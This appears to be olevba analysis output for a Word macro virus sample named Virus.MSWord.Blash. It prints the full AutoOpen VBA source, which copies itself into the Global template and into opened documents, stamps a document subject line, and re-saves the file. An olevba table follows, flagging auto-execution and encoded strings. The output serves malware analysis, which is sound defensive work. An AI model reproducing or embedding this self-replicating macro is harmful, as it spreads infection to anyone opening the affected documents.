olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Blash-e4a71b53715a430fa19449f62e8fdb2e330f86f0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Blash-e4a71b53715a430fa19449f62e8fdb2e330f86f0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Blash-e4a71b53715a430fa19449f62e8fdb2e330f86f0 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Fname$
Dim MacName$
On Error GoTo -1: On Error GoTo errori
Fname$ = WordBasic.[FileName$]()
MacName$ = Fname$ + ":aUTOOPEn"
WordBasic.FileSummaryInfo Subject:="DEMONS STRIDE AT THE GATE OF BLASHYRKH"
WordBasic.MacroCopy MacName$, "Global:aUTOOPEn"
errori:
If WordBasic.IsDocumentDirty() = -1 Then
        WordBasic.MacroCopy "Global:aUTOOPEn", MacName$
End If
WordBasic.FileSaveAs Format:=1

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

